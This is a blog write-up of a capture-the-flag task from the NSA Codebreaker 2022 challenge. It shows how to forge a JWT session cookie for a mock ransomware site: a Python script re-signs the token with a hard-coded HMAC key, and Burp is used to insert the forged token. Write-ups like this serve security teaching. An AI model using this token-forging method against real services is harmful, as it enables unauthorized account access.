---
title: "NSACodebreaker2022 - Task6"
topic: "general"
tags: ["web-hacking", "software-development"]
prev: "http://andrewromans.com/posts/nsacodebreaker2022-task5"
next: "http://andrewromans.com/posts/nsacodebreaker2022-task7"
date: 2022-12-20T11:37:37-05:05
---

# Table of Contents
1. [Task A1](http://localhost:1313/posts/nsacodebreaker2022-taska1)
2. [Task A2](http://localhost:1313/posts/nsacodebreaker2022-taska2)
3. [Task B1](http://localhost:1313/posts/nsacodebreaker2022-taskb1/)
4. [Task B2](http://localhost:1313/posts/nsacodebreaker2022-taskb2/)
5. [Task 5](http://localhost:1313/posts/nsacodebreaker2022-task5/)
6. [Task 6](#task-6)
	- [Solution](#solution)
7. [Task 7](http://localhost:1313/posts/nsacodebreaker2022-task7/)
8. [Task 8](http://localhost:1313/posts/nsacodebreaker2022-task8/)
9. [Task 9](http://localhost:1313/posts/nsacodebreaker2022-task9/)

## Task 6

- - -
###### We've found the login page on the ransomware site, but we don't know anyone's username or password. Luckily, the file you recovered from the attacker's computer looks like it could be helpful.

###### Generate a new token value which will allow you to access the ransomware site.
- - -

### Solution

The file that we've decoded seems to be a Json Web Token, or JWT for short! These can be easily used to spoof login as another user without needing their username or password. Very powerful!

We can see what information the cookie holds by copying and pasting it into [jwt.io](https://jwt.io/)

```
# The Token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTI1NjA2ODcsImV4cCI6MTY1NTE1MjY4Nywic2VjIjoiSDBidzM5N09jUHgyMlZBa1NQSTd3c3ZaNXFuZGlTakEiLCJ1aWQiOjIyNDkyfQ.QgxdO3-_ZI3InW90GiQvOjddffZOSboRVNGWohWdWnM
```

Looking at the JWT information, we can see that the assigned expiration date of the cookie has way passed. In order to recreate a valid cookie, we can make use of our scripting skills! Luckily for us, the `util.py` script from the source code we've capture earlier has some important information we can use to generate our own valid JWT token, such as the hard coded `hmack_key`.

```python
#!/usr/bin/env python3 

import jwt 
import time
from datetime import datetime, timedelta

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjEwMDY0MjYsImV4cCI6MTY2MTA5Mjc5NCwic2VjIjoiSDBidzM5N09jUHgyMlZBa1NQSTd3c3ZaNXFuZGlTakEiLCJ1aWQiOjIyNDkyfQ.mYmRxGmRR6QwhfZ_ZljSarJILmbJMUFNvrnlyinN6h8"

def hmac_key():
	return "R7RNY65GilmD4Hbw9ckndVcZ4QBpbUmA"

def validate_token(token):
	try:
		claims = jwt.decode(token, hmac_key(), algorithms=['HS256'])
		print(claims)
	except:
		print("OOF!")

def generate_token(uid, secret):
	now = datetime.now()
	exp = now + timedelta(days=30)
	claims = {'iat': now,
			  'exp': exp,
			  'uid': uid,
			  'sec': secret}
	return jwt.encode(claims, hmac_key(), algorithm='HS256')


import codecs
hex_str = "48 30 62 77 33 39 37 4F 63 50 78 32 32 56 41 6B 53 50 49 37 77 73 76 5A 35 71 6E 64 69 53 6A 41"
hex_str = hex_str.split(" ")
hex_str = "".join(hex_str)
hex_str = codecs.decode(hex_str, "hex").decode('utf-8')

token = generate_token("22492", hex_str)
print(f"==== GENERATED TOKEN ====\n\n {token} \n\n")
validate_token(token)
```

Running this script should give us a valid JWT token.

```
==== GENERATED TOKEN ====

 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjA5OTI2NDUsImV4cCI6MTY2MzU4NDY0NSwidWlkIjoiMjI0OTIiLCJzZWMiOiJIMGJ3Mzk3T2NQeDIyVkFrU1BJN3dzdlo1cW5kaVNqQSJ9.jhO2T7ZJXOK_9d84l2H8FoABgs3QRPf0ZOUNN237HRg 


{'iat': 1660992645, 'exp': 1663584645, 'uid': '22492', 'sec': 'H0bw397OcPx22VAkSPI7wsvZ5qndiSjA'}
 gC4Zcze36Mo0G9hY89MavH0XU213mF
```

We can see in the source code of the server that the cookie name used for validation is `tok`. Using `Burp` we can easily capture any outgoing data and replace/add a cookie called `tok` with our newly valid JWT token generated above. 

The correct answer:

The cookie you generate at the time, which for my case was:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjA5OTI2NDUsImV4cCI6MTY2MzU4NDY0NSwidWlkIjoiMjI0OTIiLCJzZWMiOiJIMGJ3Mzk3T2NQeDIyVkFrU1BJN3dzdlo1cW5kaVNqQSJ9.jhO2T7ZJXOK_9d84l2H8FoABgs3QRPf0ZOUNN237HRg`

![Task 6 Badge](/posts/badge6.png "Task 6 Badge")

- - -